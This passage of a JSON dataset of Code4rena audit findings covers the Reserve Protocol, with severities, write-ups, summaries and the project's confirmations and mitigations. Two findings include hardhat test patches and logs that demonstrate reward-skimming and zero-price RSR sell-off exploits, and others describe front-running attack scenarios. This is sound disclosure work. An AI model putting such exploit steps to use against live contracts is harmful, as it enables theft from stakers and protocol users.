issue](https://github.com/code-423n4/2023-01-reserve-findings/issues/234) in the January audit.\n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/8#issuecomment-1662939816):**\n > Got it, checks out. Thanks!\n\n**[Reserve mitigated](https://github.com/code-423n4/2023-08-reserve-mitigation#individual-prs):**\n> Add oracle deprecation check.<br>\n> PR: https://github.com/reserve-protocol/protocol/pull/886\n\n**Status:** Mitigation confirmed. Full details in reports from [0xA5DF](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/35), [ronnyx2017](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/28), and [rvierdiiev](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/17) - and also shared below in the [Mitigation Review](#mitigation-review) section.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with Dutch Auction in the Reserve Protocol that can result in users not being able to bid on an auction for some time, leading to the protocol's assets being auctioned for a price lower than the market price. This is caused by an assumption that if the error data is empty, it is due to an out-of-gas error, which is not always true. \n\nThe proof of concept for this bug is a scenario in which Chainlink announces that an oracle will get deprecated, a re-balancing is required and executed with a Dutch Auction, and the oracle deprecation happens before the auction price reaches a reasonable value. Any bid while the oracle is deprecated will revert, and right before the auction ends the proposal to update the asset becomes available for execution. \n\nThe recommended mitigation steps for this issue include checking that the error data is empty, and comparing the gas before and after to ensure this is an out-of-gas error. After some discussion in the report, Reserve mitigated the issue by adding an oracle deprecation check, and the mitigation was confirmed by reports from 0xA5DF, ronnyx2017, and rvierdiiev.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "https://github.com/code-423n4/2023-06-reserve-findings/issues/8",
      "tags": [],
      "finders": [
        "0xA5DF"
      ]
    },
    {
      "id": "27341",
      "title": "[M-09] `cancelUnstake` lack `payoutRewards` before mint shares",
      "impact": "MEDIUM",
      "content": "\n`cancelUnstake` will cancel the withdrawal request in the queue can mint shares as the current `stakeRate`. But it doesn't `payoutRewards` before `mintStakes`. Therefor it will mint stRsr as a lower rate, which means it will get more rsr.\n\n### Impact\n\nWithdrawers in the unstake queue can `cancelUnstake` without calling `payoutRewards` to get more rsr rewards that should not belong to them.\n\n### Proof of Concept\n\nPOC test/ZZStRSR.test.ts git patch\n\n```patch\ndiff --git a/test/ZZStRSR.test.ts b/test/ZZStRSR.test.ts\nindex ecc31f68..b2809129 100644\n--- a/test/ZZStRSR.test.ts\n+++ b/test/ZZStRSR.test.ts\n@@ -1333,6 +1333,46 @@ describe(`StRSRP${IMPLEMENTATION} contract`, () => {\n       expect(await stRSR.exchangeRate()).to.be.gt(initialRate)\n     })\n \n+    it('cancelUnstake', async () => {\n+      const amount: BigNumber = bn('10e18')\n+\n+      // Stake\n+      await rsr.connect(addr1).approve(stRSR.address, amount)\n+      await stRSR.connect(addr1).stake(amount)\n+      await rsr.connect(addr2).approve(stRSR.address, amount)\n+      await stRSR.connect(addr2).stake(amount)\n+      await rsr.connect(addr3).approve(stRSR.address, amount)\n+      await stRSR.connect(addr3).stake(amount)\n+\n+      const  initExchangeRate = await stRSR.exchangeRate();\n+      console.log(initExchangeRate);\n+\n+      // Unstake addr2 & addr3 at same time (Although in different blocks, but timestamp only 1s)\n+      await stRSR.connect(addr2).unstake(amount)\n+      await stRSR.connect(addr3).unstake(amount)\n+\n+      // skip 1000 block PERIOD / 12000s\n+      await setNextBlockTimestamp(Number(ONE_PERIOD.mul(1000).add(await getLatestBlockTimestamp())))\n+\n+      // Let's cancel the unstake in normal\n+      await expect(stRSR.connect(addr2).cancelUnstake(1)).to.emit(stRSR, 'UnstakingCancelled')\n+      let exchangeRate = await stRSR.exchangeRate();\n+      expect(exchangeRate).to.equal(initExchangeRate)\n+      \n+      // addr3 cancelUnstake after payoutRewards\n+      await stRSR.payoutRewards()\n+      await expect(stRSR.connect(addr3).cancelUnstake(1)).to.emit(stRSR, 'UnstakingCancelled')\n+\n+      // Check balances addr2 & addr3\n+      exchangeRate = await stRSR.exchangeRate();\n+      expect(exchangeRate).to.be.gt(initExchangeRate)\n+      const addr2NowAmount = exchangeRate.mul(await stRSR.balanceOf(addr2.address)).div(bn('1e18'));\n+      console.log(\"addr2\", addr2NowAmount.toString());\n+      const addr3NowAmount = exchangeRate.mul(await stRSR.balanceOf(addr3.address)).div(bn('1e18'));\n+      console.log(\"addr3\",addr3NowAmount.toString());\n+      expect(addr2NowAmount).to.gt(addr3NowAmount)\n+    })\n+\n     it('Rewards should not be handed out when paused but staking should still work', async () => {\n       await main.connect(owner).pauseTrading()\n       await setNextBlockTimestamp(Number(ONE_PERIOD.add(await getLatestBlockTimestamp())))\n\n```\n\nThe test simulates two users unstake and cancelUnstake operations at the same time.But the addr2 calls payoutRewards after his cancelUnstake. And addr3 calls cancelUnstake after payoutRewards. Addr2 gets more rsr than addr3 in the end.\n\nrun test:\n\n    PROTO_IMPL=1 npx hardhat test --grep cancelUnstake test/ZZStRSR.test.ts\n\nlog:\n\n      StRSRP1 contract\n        Add RSR / Rewards\n    BigNumber { value: \"1000000000000000000\" }\n    addr2 10005345501258588240\n    addr3 10000000000000000013\n\n### Recommended Mitigation Steps\n\nCall `_payoutRewards` before mint shares.\n\n**[tbrent (Reserve) confirmed and commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/10#issuecomment-1589913989):**\n > Agree with severity and proposed mitigation.\n\n**[Reserve mitigated](https://github.com/code-423n4/2023-08-reserve-mitigation#individual-prs):**\n> Payout rewards during cancelUnstake.<br>\n> PR: https://github.com/reserve-protocol/protocol-private/pull/3\n\n**Status:** Mitigation confirmed. Full details in reports from [rvierdiiev](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/16), [0xA5DF](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/33), and [ronnyx2017](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/26) - and also shared below in the [Mitigation Review](#mitigation-review) section.\n\n\n\n***\n\n",
      "summary": "\nA bug was discovered in the `cancelUnstake` function of the StRSR protocol, which allowed users to withdraw from the unstake queue without calling `payoutRewards` and receive more rewards than they should have. This could have resulted in users receiving rewards that did not belong to them.\n\nA proof of concept test was conducted to demonstrate the bug, and the results showed that users who called `payoutRewards` before `cancelUnstake` received fewer rewards than those who called `cancelUnstake` before `payoutRewards`.\n\nTo mitigate this issue, the protocol team proposed calling `payoutRewards` before minting shares. This was confirmed by the team and a pull request was made to implement the mitigation. The mitigation was confirmed and the full details can be found in reports from the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "https://github.com/code-423n4/2023-06-reserve-findings/issues/10",
      "tags": [],
      "finders": [
        "0xA5DF",
        "ronnyx2017",
        "rvierdiiev"
      ]
    },
    {
      "id": "27340",
      "title": "[M-08] Stake before unfreeze can take away most of rsr rewards in the freeze period",
      "impact": "MEDIUM",
      "content": "\nIf the system is frozen, the only allowed operation is `stRST.stake`. And the `_payoutRewards` is not called during freeze period:\n\n    if (!main.frozen()) _payoutRewards();\n\n    function payoutRewards() external {\n        requireNotFrozen();\n        _payoutRewards();\n    }\n\nSo the `payoutLastPaid` stays before the freeze period. But when the system is unfreezed, accumulated rewards will be released all at once because the block.timestamp leapt the whole freeze period.\n\n### Impact\n\nA front runner can stake huge proportion rsr before admin unfreezes the system. And the attacker can get most of rsr rewards in the next block. And he only takes the risk of the `unstakingDelay` period.\n\n### Proof of Concept\n\nAssumption: there are 2000 rsr stake in the stRSR, and there are 1000 rsr rewards in the `rsrRewardsAtLastPayout` with a 1 year half-life period.\n\nAnd at present, the LONG_FREEZER `freezeLong` system for 1 year(default).\n\nAfter 1 year, at the unfreeze point, a front runner stake 2000 rsr into stRSR. And then the system is unfreeze. And in the next blcok,the front runner unstakes all the stRSR he has for `2250 rsr = 2000 principal + 1000 / 2 / 2 rsr rewards`.\n\nThe only risk he took is `unstakingDelay`. The original rsr stakers took the risk of the whole freeze period + `unstakingDelay` but only got a part of rewards back.\n\n### Recommended Mitigation Steps\n\npayoutRewards before freeze and update payoutLastPaid before unfreeze.\n\n**[tbrent (Reserve) confirmed via duplicate issue #24](https://github.com/code-423n4/2023-06-reserve-findings/issues/24)**\n\n**[Reserve mitigated](https://github.com/code-423n4/2023-08-reserve-mitigation#individual-prs):**\n> `payoutRewards` before freeze and update `payoutLastPaid` before unfreeze.<br>\n> PR: https://github.com/reserve-protocol/protocol/pull/857\n\n**Status:** Mitigation confirmed. Full details in reports from [rvierdiiev](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/15), [0xA5DF](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/38), and [ronnyx2017](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/25) - and also shared below in the [Mitigation Review](#mitigation-review) section.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Reserve Protocol, which is a decentralized finance (DeFi) protocol. If the system is frozen, the only allowed operation is `stRST.stake` and the `_payoutRewards` will not be called during the freeze period. This means that the `payoutLastPaid` stays before the freeze period. When the system is unfreezed, accumulated rewards will be released all at once because the block.timestamp leapt the whole freeze period. \n\nThis vulnerability allows a front runner to stake a large proportion of the Reserve Protocol's token (RSR) before the admin unfreezes the system. The attacker can then get most of the RSR rewards in the next block with only the risk of the `unstakingDelay` period. \n\nTo mitigate this vulnerability, the Reserve Protocol team recommended to payoutRewards before freezing and update payoutLastPaid before unfreezing. This mitigation was confirmed by the Reserve Protocol team via duplicate issue #24 and implemented with a pull request to the protocol. Reports from rvierdiiev, 0xA5DF, and ronnyx2017 also confirmed the mitigation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "https://github.com/code-423n4/2023-06-reserve-findings/issues/11",
      "tags": [],
      "finders": [
        "0xA5DF",
        "ronnyx2017",
        "rvierdiiev"
      ]
    },
    {
      "id": "27339",
      "title": "[M-07] Sell reward `rTokens` at low price because of skiping `furnace.melt`",
      "impact": "MEDIUM",
      "content": "\nThe reward rToken sent to RevenueTrader will be sold at a low price. RSR stakers will lose some of their profits.\n\n### Proof of Concept\n\n`RevenueTraderP1.manageToken` function is used to launch auctions for any erc20 tokens sent to it. For the RevenueTrader of the rsr stake, the `tokenToBuy` is rsr and the token to sell is reward rtoken.\n\nThere is the refresh code in the `manageToken` function:\n\n    } else if (assetRegistry.lastRefresh() != uint48(block.timestamp)) {\n        // Refresh everything only if RToken is being traded\n        assetRegistry.refresh();\n        furnace.melt();\n    }\n\nIt refreshes only when the assetRegistry has not been refreshed in the same block.\n\nSo if the actor calls the `assetRegistry.refresh()` before calling `manageToken` function, the `furnace.melt()` won't been called. And the BU exchange rate of the RToken will be lower than actual value. So the sellPrice is also going to be smaller.\n\n    (uint192 sellPrice, ) = sell.price(); // {UoA/tok}\n\n    TradeInfo memory trade = TradeInfo({\n        sell: sell,\n        buy: buy,\n        sellAmount: sell.bal(address(this)),\n        buyAmount: 0,\n        sellPrice: sellPrice,\n        buyPrice: buyPrice\n    });\n\n### Recommended Mitigation Steps\n\nRefresh everything before sell rewards.\n\n**[tbrent (Reserve) confirmed](https://github.com/code-423n4/2023-06-reserve-findings/issues/13#issuecomment-1620818933)**\n\n**[Reserve mitigated](https://github.com/code-423n4/2023-08-reserve-mitigation#individual-prs):**\n> Refresh before selling rewards, refactor revenue & distro.<br>\n> PR: https://github.com/reserve-protocol/protocol-private/pull/7\n\n**Status:** Mitigation confirmed. Full details in reports from [ronnyx2017](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/24), [0xA5DF](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/34), and [rvierdiiev](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/14) - and also shared below in the [Mitigation Review](#mitigation-review) section.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the `RevenueTraderP1.manageToken` function which is used to launch auctions for any erc20 tokens sent to it. If the `assetRegistry.refresh()` function is called before the `manageToken` function, the `furnace.melt()` won't be called and the buying exchange rate of the RToken will be lower than the actual value. This would result in RSR stakers losing some of their profits.\n\nTo mitigate this, the developers recommended refreshing everything before selling rewards and refactoring the revenue and distro. These mitigation steps were confirmed by tbrent (Reserve) and Reserve mitigated the issue by implementing the changes in a pull request. The mitigation was further reviewed by ronnyx2017, 0xA5DF, and rvierdiiev.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "https://github.com/code-423n4/2023-06-reserve-findings/issues/13",
      "tags": [],
      "finders": [
        "ronnyx2017"
      ]
    },
    {
      "id": "27338",
      "title": "[M-06]  Oracle timeout at rebalance will result in a sell-off of all RSRs at 0 price",
      "impact": "MEDIUM",
      "content": "\nWhen creating the trade for rebalance, the `RecollateralizationLibP1.nextTradePair` uses `(uint192 low, uint192 high) = rsrAsset.price(); // {UoA/tok}` to get the rsr sell price. And the rsr assert is a pure Assert contract, which `price()` function will just return (0, FIX\\_MAX) if oracle is timeout:\n\n    function price() public view virtual returns (uint192, uint192) {\n        try this.tryPrice() returns (uint192 low, uint192 high, uint192) {\n            assert(low <= high);\n            return (low, high);\n        } catch (bytes memory errData) {\n            ...\n            return (0, FIX_MAX);\n        }\n    }\n\nThe `trade.sellAmount` will be all the rsr in the `BackingManager` and `stRSR`:\n\n    uint192 rsrAvailable = rsrAsset.bal(address(ctx.bm)).plus(\n        rsrAsset.bal(address(ctx.stRSR))\n    );\n    trade.sellAmount = rsrAvailable;\n\nIt will be cut down to a normal amount fit for buying UoA amount in the `trade.prepareTradeToCoverDeficit` function.\n\nBut if the rsr oracle is timeout and returns a 0 low price. The trade req will be made by `trade.prepareTradeSell`, which will sell all the available rsr at 0 price.\n\nNote that the SOUND colls won't be affected by the issue because the sell amount has already been cut down by basketsNeeded.\n\nLoss huge amount of rsr in the auction. When huge amounts of assets are auctioned off at zero, panic and insufficient liquidity make the outcome unpredictable.\n\n### Proof of Concept\n\nPOC git diff test/Recollateralization.test.ts\n\n```patch\ndiff --git a/test/Recollateralization.test.ts b/test/Recollateralization.test.ts\nindex 86cd3e88..15639916 100644\n--- a/test/Recollateralization.test.ts\n+++ b/test/Recollateralization.test.ts\n@@ -51,7 +51,7 @@ import {\n import snapshotGasCost from './utils/snapshotGasCost'\n import { expectTrade, getTrade, dutchBuyAmount } from './utils/trades'\n import { withinQuad } from './utils/matchers'\n-import { expectRTokenPrice, setOraclePrice } from './utils/oracles'\n+import { expectRTokenPrice, setInvalidOracleTimestamp, setOraclePrice } from './utils/oracles'\n import { useEnv } from '#/utils/env'\n import { mintCollaterals } from './utils/tokens'\n \n@@ -797,6 +797,166 @@ describe(`Recollateralization - P${IMPLEMENTATION}`, () => {\n   })\n \n   describe('Recollateralization', function () {\n+    context('With simple Basket - Two stablecoins', function () {\n+      let issueAmount: BigNumber\n+      let stakeAmount: BigNumber\n+\n+      beforeEach(async function () {\n+        // Issue some RTokens to user\n+        issueAmount = bn('100e18')\n+        stakeAmount = bn('10000e18')\n+\n+        // Setup new basket with token0 & token1\n+        await basketHandler.connect(owner).setPrimeBasket([token0.address, token1.address], [fp('0.5'), fp('0.5')])\n+        await basketHandler.connect(owner).refreshBasket()\n+\n+        // Provide approvals\n+        await token0.connect(addr1).approve(rToken.address, initialBal)\n+        await token1.connect(addr1).approve(rToken.address, initialBal)\n+\n+        // Issue rTokens\n+        await rToken.connect(addr1).issue(issueAmount)\n+\n+        // Stake some RSR\n+        await rsr.connect(owner).mint(addr1.address, initialBal)\n+        await rsr.connect(addr1).approve(stRSR.address, stakeAmount)\n+        await stRSR.connect(addr1).stake(stakeAmount)\n+      })\n+      \n+      it('C4M7', async () => {\n+        // Register Collateral\n+        await assetRegistry.connect(owner).register(backupCollateral1.address)\n+  \n+        // Set backup configuration - USDT as backup\n+        await basketHandler\n+          .connect(owner)\n+          .setBackupConfig(ethers.utils.formatBytes32String('USD'), bn(1), [backupToken1.address])\n+        \n+        // Set Token0 to default - 50% price reduction\n+        await setOraclePrice(collateral0.address, bn('0.5e8'))\n+  \n+        // Mark default as probable\n+        await assetRegistry.refresh()\n+        // Advance time post collateral's default delay\n+        await advanceTime((await collateral0.delayUntilDefault()).toString())\n+  \n+        // Confirm default and trigger basket switch\n+        await basketHandler.refreshBasket()\n+  \n+        // Advance time post warmup period - SOUND just regained\n+        await advanceTime(Number(config.warmupPeriod) + 1)\n+  \n+        const initToken1B = await token1.balanceOf(backingManager.address);\n+        // rebalance\n+        const token1Decimal = 6;\n+        const sellAmt: BigNumber = await token0.balanceOf(backingManager.address)\n+        const buyAmt: BigNumber = sellAmt.div(2)\n+        await facadeTest.runAuctionsForAllTraders(rToken.address);\n+        // bid\n+        await backupToken1.connect(addr1).approve(gnosis.address, sellAmt)\n+        await gnosis.placeBid(0, {\n+          bidder: addr1.address,\n+          sellAmount: sellAmt,\n+          buyAmount: buyAmt,\n+        })\n+        await advanceTime(config.batchAuctionLength.add(100).toString())\n+        // await facadeTest.runAuctionsForAllTraders(rToken.address);\n+        const rsrAssert = await assetRegistry.callStatic.toAsset(rsr.address);\n+        await setInvalidOracleTimestamp(rsrAssert);\n+        await expectEvents(facadeTest.runAuctionsForAllTraders(rToken.address), [\n+          {\n+            contract: backingManager,\n+            name: 'TradeSettled',\n+            args: [anyValue, token0.address, backupToken1.address, sellAmt, buyAmt],\n+            emitted: true,\n+          },\n+          {\n+            contract: backingManager,\n+            name: 'TradeStarted',\n+            args: [anyValue, rsr.address, backupToken1.address, stakeAmount, anyValue], // sell 25762677277828792981\n+            emitted: true,\n+          },\n+        ])\n+  \n+        // check\n+        console.log(await token0.balanceOf(backingManager.address));\n+        const currentToken1B = await token1.balanceOf(backingManager.address);\n+        console.log(currentToken1B);\n+        console.log(await backupToken1.balanceOf(backingManager.address));\n+        const rsrB = await rsr.balanceOf(stRSR.address);\n+        console.log(rsrB);\n+  \n+        // expect\n+        expect(rsrB).to.eq(0);\n+      })\n+    })\n+\n     context('With very simple Basket - Single stablecoin', function () {\n       let issueAmount: BigNumber\n       let stakeAmount: BigNumber\n\n```\n\nrun test:\n\n    PROTO_IMPL=1 npx hardhat test --grep 'C4M7' test/Recollateralization.test.ts\n\nlog:\n\n      Recollateralization - P1\n        Recollateralization\n          With simple Basket - Two stablecoins\n    BigNumber { value: \"0\" }\n    BigNumber { value: \"50000000\" }\n    BigNumber { value: \"25000000000000000000\" }\n    BigNumber { value: \"0\" }\n\n### Recommended Mitigation Steps\n\nUsing lotPrice or just revert for rsr oracle timeout might be a good idea.\n\n\n**[tbrent (Reserve) confirmed and commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/15#issuecomment-1588048139):**\n > Hmm, interesting case.\n> \n> There are two types of auctions that can occur: batch auctions via `GnosisTrade`, and dutch auctions via `DutchTrade`. \n> \n> Batch auctions via `GnosisTrade` are good at discovering prices when price is unknown. It would require self-interested parties to be offline for the entire duration of the batch auction (default: 15 minutes) in order for someone to get away with buying the RSR for close to 0. \n> \n> Dutch auctions via `DutchTrade` do not have this problem because of an assert that reverts at the top of the contract.\n> \n> I'm inclined to dispute validity, but I also agree it might be strictly better to use the `lotPrice()`. When trading out backing collateral it is important to sell it quickly and not have to wait for `lotPrice()` to decay sufficiently, but this is not true with RSR. For RSR it might be fine to wait as long as a week for the `lotPrice()` to fall to near 0. \n> \n> This would then allow dutch auctions via `DutchTrade` to be used when RSR's oracle is offline.\n\n**[Reserve mitigated](https://github.com/code-423n4/2023-08-reserve-mitigation#individual-prs):**\n> Use `lotPrice()`.<br>\n> PR: https://github.com/reserve-protocol/protocol-private/pull/15\n\n**Status:** Mitigation confirmed. Full details in reports from [rvierdiiev](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/13), [0xA5DF](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/41), and [ronnyx2017](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/23) - and also shared below in the [Mitigation Review](#mitigation-review) section.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue in the Reserve Protocol when creating a trade for rebalance. When the rsr oracle is timed out, the `RecollateralizationLibP1.nextTradePair` uses the `price()` function of the rsr assert contract which returns (0, FIX\\_MAX). As a result, the `trade.sellAmount` will be all the rsr in the `BackingManager` and `stRSR`. This will cause a huge amount of assets to be auctioned off at zero, leading to panic and insufficient liquidity which can make the outcome unpredictable.\n\nThe recommended mitigation steps are to use `lotPrice()` and a pull request has been created for this. This has been confirmed and the full details can be found in the reports from rvierdiiev, 0xA5DF, and ronnyx2017.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "https://github.com/code-423n4/2023-06-reserve-findings/issues/15",
      "tags": [],
      "finders": [
        "ronnyx2017"
      ]
    },
    {
      "id": "27337",
      "title": "[M-05] Lack of claimRewards when manageToken in RevenueTrader",
      "impact": "MEDIUM",
      "content": "\nThere is a dev comment in the Assert.sol:\n\n    DEPRECATED: claimRewards() will be removed from all assets and collateral plugins\n\nThe claimRewards is moved to the `TradingP1.claimRewards/claimRewardsSingle`.\n\nBut when the `RevenueTraderP1` trade and distribute revenues by `manageToken`, it only calls the refresh function of the asserts:\n\n    if (erc20 != IERC20(address(rToken)) && tokenToBuy != IERC20(address(rToken))) {\n        IAsset sell_ = assetRegistry.toAsset(erc20);\n        IAsset buy_ = assetRegistry.toAsset(tokenToBuy);\n        if (sell_.lastSave() != uint48(block.timestamp)) sell_.refresh();\n        if (buy_.lastSave() != uint48(block.timestamp)) buy_.refresh();\n    }\n\nThe claimRewards is left out.\n\n### Impact\n\nPotential loss of rewards.\n\n### Recommended Mitigation Steps\n\nAdd claimRewardsSingle when refresh assert in the `manageToken`.\n\n\n**[tbrent (Reserve) disputed and commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/16#issuecomment-1588019948):**\n > This is similar to an (unmitigated) issue from an earlier audit: https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/22\n> \n> However in this case it has to do with `RevenueTraderP1.manageToken()`, as opposed to `BackingManagerP1.manageTokens()`. \n> \n> I think that difference matters, because the loss of the rewards _for this auction_ does not have serious long-term consequences. This is not like the BackingManager where it's important that all capital always be available else an unnecessarily large haircut could occur. Instead, the worst that can happen is for the revenue auction to complete at high slippage, and for a second reward token revenue auction to complete afterwards at high slippage yet again, when it could have been a single revenue auction with less slippage. \n>\n> The recommended mitigation would not succeed, because recall, we may be selling token X but any number of additional assets could have token X as a reward token. We would need to call `claimRewards()`, which is simply too gas-costly to do everytime for revenue auctions.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/16#issuecomment-1633111555):**\n > > Instead, the worst that can happen is for the revenue auction to complete at high slippage, and for a second reward token revenue auction to complete afterwards at high slippage yet again, when it could have been a single revenue auction with less slippage.\n> \n> @tbrent - The impact sounds like a \"leak of value\" and therefore I think Medium is the correct severity per the c4 docs. (cc @tbrent - open to additional comment here) \n\n\n\n***\n\n",
      "summary": "\nThis bug report is related to the Assert.sol file in the code-423n4/2023-06-reserve-findings repository. It states that the claimRewards function has been moved to the TradingP1.claimRewards/claimRewardsSingle, but when the RevenueTraderP1 trade and distribute revenues by manageToken, it only calls the refresh function of the asserts. This means that the claimRewards is left out, which could lead to a potential loss of rewards. \n\nThe recommended mitigation steps are to add claimRewardsSingle when refresh assert in the manageToken. However, it was disputed that this would not succeed because it would be too gas-costly to do everytime for revenue auctions. It was then concluded that the impact of this bug is a \"leak of value\", and the severity is rated as medium.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "https://github.com/code-423n4/2023-06-reserve-findings/issues/16",
      "tags": [],
      "finders": [
        "ronnyx2017"
      ]
    },
    {
      "id": "27336",
      "title": "[M-04] FurnaceP1.setRatio will work incorrectly after call when frozen",
      "impact": "MEDIUM",
      "content": "\n`FurnaceP1.setRatio` will not update `lastPayout` when called in frozen state, which means that after component will be unfrozen, melting will be incorrect.\n\n### Proof of Concept\n\n`melt` function should burn some amount of tokens from `lastPayoutBal`. It depends of `lastPayout` and `ratio` variables. The more time has passed, the more tokens will be burnt.\n\nWhen `setRatio` function is called, then `melt` function [is tried to be executed](https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/Furnace.sol#L86), because new ratio is provided and it should not be used for previous time ranges.\nIn case if everything is ok, then `lastPayout` and `lastPayoutBal` will be updated, so it's safe to update `ratio` now.\nBut it's possible that `melt` function will revert in case if `notFrozen` modifier is not passed. As result `lastPayout` and `lastPayoutBal` will not be updated, but ratio will be. Because of that, when `Furnace` will be unfrozen, then melting rate can be much more, then it should be, because `lastPayout` wasn't updated.\n\n### Tools Used\n\nVsCode\n\n### Recommended Mitigation Steps\n\nIn case of `catch` case, you can update `lastPayout` and `lastPayoutBal`.\n\n**[tbrent (Reserve) confirmed](https://github.com/code-423n4/2023-06-reserve-findings/issues/29#issuecomment-1620802303)**\n\n**[Reserve mitigated](https://github.com/code-423n4/2023-08-reserve-mitigation#individual-prs):**\n> Update payout variables if melt fails during `setRatio`.<br>\n> PR: https://github.com/reserve-protocol/protocol/pull/885\n\n**Status:** Mitigation error. Full details in report from [0xA5DF](https://github.com/code-423n4/2023-08-reserve-mitigation-findings/issues/37) - and also shared below in the [Mitigation Review](#mitigation-review) section.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a bug found in the `FurnaceP1.setRatio` function of the Reserve Protocol. This function is used to update the ratio variable, but when called in a frozen state, it will not update the `lastPayout` variable, which means that after the component is unfrozen, the melting rate will be incorrect. \n\nTo demonstrate the bug, the `melt` function was used. This function should burn some amount of tokens from `lastPayoutBal`, based on the `lastPayout` and `ratio` variables. If the `setRatio` function is called, the `melt` function is attempted to be executed, and if successful, the `lastPayout` and `lastPayoutBal` variables will be updated. However, if the `notFrozen` modifier is not passed, the `melt` function will revert, which means that the `lastPayout` and `lastPayoutBal` variables will not be updated, but the ratio will be. As a result, when the `Furnace` is unfrozen, the melting rate will be much higher than it should be.\n\nTo mitigate the error, the `lastPayout` and `lastPayoutBal` variables should be updated in the event of a `catch` case. This mitigation was confirmed by tbrent of Reserve, and was implemented in a pull request. However, a further report from 0xA5DF revealed that the mitigation had not been successful, and further steps need to be taken.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "https://github.com/code-423n4/2023-06-reserve-findings/issues/29",
      "tags": [],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "27335",
      "title": "[M-03] In case `Distributor.setDistribution` use, revenue from rToken RevenueTrader and rsr token RevenueTrader should be distributed",
      "impact": "MEDIUM",
      "content": "\nIn case Distributor.setDistribution use, revenue from rToken RevenueTrader and rsr token RevenueTrader should be distributed. Otherwise wrong distribution will be used.\n\n### Proof of Concept\n\n`BackingManager.forwardRevenue` function sends revenue amount to the `rsrTrader` and `rTokenTrader` contracts, [according to the distribution inside `Distributor` contract](https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/BackingManager.sol#L236-L249). For example it can `50%`/`50%`. In case if we have 2 destinations in Distributor: strsr and furnace, that means that half of revenue will be received by strsr stakers as rewards.\n\nThis distribution [can be changed](https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/Distributor.sol#L61-L65) at any time.<br>\nThe job of `RevenueTrader` is to sell provided token for a `tokenToBuy` and then distribute it using `Distributor.distribute` function. There are 2 ways of auction that are used: dutch and gnosis. Dutch auction will call `RevenueTrader.settleTrade`, which [will initiate distribution](https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/RevenueTrader.sol#L50). But Gnosis trade will not do that and user should call `distributeTokenToBuy` manually, after auction is settled.\n\nThe problem that I want to discuss is next.<br>\nSuppose, that governance at the beginning set distribution as 50/50 between 2 destinations: strsr and furnace. And then later `forwardRevenue` sent some tokens to the rsrTrader and rTokenTrader. Then, when trade was active to exchange some token to rsr token, `Distributor.setDistribution` was set in order to make strsr share to 0, so now everything goes to Furnace only. As result, when trade will be finished in the rsrTrader and `Distributor.distribute` will be called, then those tokens will not be sent to the strsr contract, because their share is 0 now.\nThey will be stuck inside rsrTrader.\n\nAnother problem here is that strsr holders should receive all revenue from the time, where they distribution were created. What i mean is if in time 0, rsr share was 50% and in time 10 rsr share is 10%, then `BackingManager.forwardRevenue` should be called for all tokens that has surplus, because if that will be done after changing to 10%, then strsr stakers will receive less revenue.\n\n### Tools Used\n\nVsCode\n\n### Recommended Mitigation Steps\n\nYou need to think how to guarantee fair distribution to the strsr stakers, when distribution params are changed.\n\n**[tbrent (Reserve) confirmed and commented](https://github.com/code-423n4/2023-06-reserve-findings/issues/34#issuecomment-1620796074):**\n > This is a good find. The mitigation we have in mind is adding a new function to the `RevenueTrader` that allows anyone to transfer a registered ERC20 back to the `BackingManager`, as long as the current distribution for that `tokenToBuy` is 0%. \n\n**[Reserve 